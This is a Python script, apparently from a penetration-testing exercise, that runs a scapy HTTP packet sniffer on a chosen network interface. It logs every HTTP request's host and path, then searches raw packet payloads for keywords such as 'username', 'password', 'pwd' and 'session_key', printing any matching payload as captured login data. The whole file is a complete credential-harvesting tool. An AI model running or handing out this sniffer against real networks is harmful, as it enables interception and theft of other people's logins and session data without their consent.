import argparse
from termcolor import colored
import sys
try:
	import scapy.all as scapy
except KeyboardInterrupt:
	print(colored("\n[-] CTRL+C printed ... ", "red"))
	sys.exit()
import scapy_http.http as http

class Sniffer():
	def __init__(self):
		self.about()
		self.script_desc()

	def arguman_al(self):
		parser = argparse.ArgumentParser(prog=self.program,formatter_class=argparse.RawTextHelpFormatter)
		parser.add_argument("--interface",dest="interface",help="Interface selection")
		options=parser.parse_args()
		if not options.interface:
			parser.error('[-] Please specify an interface')
		else:
			return options.interface

	def sniff(self,interface):
		scapy.sniff(iface=interface,store=False,prn=self.process_sniffed_packet)

	def get_url(self,paket):
		return paket[http.HTTPRequest].Host+paket[http.HTTPRequest].Path

	def get_login_info(self,paket):
		if paket.haslayer(scapy.Raw):
			try:
				load = (paket[scapy.Raw].load).decode("utf-8")
				keywords = ["username", "user", "pass", "password", "digits", "ad", "login", "user", "word", "session_key", "session_password", "log", "pwd"]
				for keyword in keywords:
					if keyword in load:
						return load
			except UnicodeDecodeError:
				pass

	def process_sniffed_packet(self,paket):
		if paket.haslayer(http.HTTPRequest):
			url=self.get_url(paket)
			print("[+] HTTP Request >> "+url.decode("utf-8"))
			login_info=self.get_login_info(paket)
			if login_info:
				print("\n\n[+] Possible username / Password > "+str(login_info)+"\n\n")

	def script_desc(self):
		self.program = "packet_sniffer"

	def about(self):
		print(colored("# ==============================================================================", "green"))

try:
	sniffer=Sniffer()
	sniffer.sniff(sniffer.arguman_al())
except KeyboardInterrupt:
	sys.exit()